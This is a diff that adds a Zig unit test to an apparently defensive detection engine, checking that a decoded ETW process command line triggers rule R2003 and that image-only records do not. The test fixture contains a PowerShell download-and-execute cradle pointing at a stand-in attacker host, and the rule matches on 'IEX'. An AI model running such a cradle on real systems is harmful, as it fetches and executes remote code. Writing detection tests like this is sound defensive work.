@@ -1241,3 +1241,48 @@ test "RULE-COVERAGE-001: ETW CommandLine TLV decodes when the provider supplies 
     try std.testing.expectEqualStrings(img, host_shape.imagePath());
     try std.testing.expectEqualStrings("", host_shape.commandLine());
 }
+
+test "PROCESS-CMDLINE-002: decoded CommandLine fires R2003 end to end in the kernel_process lane" {
+    // The C helper now recovers CommandLine on Kernel-Process ProcessStart and
+    // appends it as AEGT TLV kind 2 without a wire/rule/authority change. This
+    // test follows those exact bytes from TLV decode -> commandLine() -> the
+    // kernel_process Aho-Corasick automaton -> R2003 rule id.
+    const sig = @import("../detection/signature_engine.zig");
+    const rules = @import("../pipeline/rule_loader.zig");
+    const alloc = std.testing.allocator;
+
+    const img = "powershell.exe";
+    const cl = "powershell -c IEX (New-Object Net.WebClient).DownloadString('https://evil.example/p.ps1')";
+    var payload: [256]u8 = [_]u8{0} ** 256;
+    @memcpy(payload[0..4], "AEGT");
+    var off: usize = 4;
+    std.mem.writeInt(u16, payload[off..][0..2], 1, .little);
+    std.mem.writeInt(u16, payload[off + 2 ..][0..2], @intCast(img.len), .little);
+    off += 4;
+    @memcpy(payload[off .. off + img.len], img);
+    off += img.len;
+    std.mem.writeInt(u16, payload[off..][0..2], 2, .little);
+    std.mem.writeInt(u16, payload[off + 2 ..][0..2], @intCast(cl.len), .little);
+    off += 4;
+    @memcpy(payload[off .. off + cl.len], cl);
+    off += cl.len;
+
+    var rec = EtwEventRecord{};
+    decodeTdhPayload(&rec, payload[0..off]);
+    try std.testing.expectEqualStrings(img, rec.imagePath());
+    try std.testing.expectEqualStrings(cl, rec.commandLine());
+
+    var kernel_process = try sig.AhoCorasick.init(alloc, 10_000);
+    defer kernel_process.deinit();
+    try kernel_process.addPattern(rules.hashRuleId("R2003"), "IEX");
+    try kernel_process.build();
+    const hit = kernel_process.matchFirst(rec.commandLine()) orelse return error.TestUnexpectedResult;
+    try std.testing.expectEqual(rules.hashRuleId("R2003"), hit.rule_id);
+
+    // Negative controls retained: image-only rows and wire payloads must NOT
+    // fire R2003. The producer adds evidence bytes; it does not widen the rule.
+    var image_only = EtwEventRecord{};
+    decodeTdhPayload(&image_only, payload[0 .. 4 + 4 + img.len]);
+    try std.testing.expectEqualStrings("", image_only.commandLine());
+    try std.testing.expect(kernel_process.matchFirst(image_only.commandLine()) == null);
+}
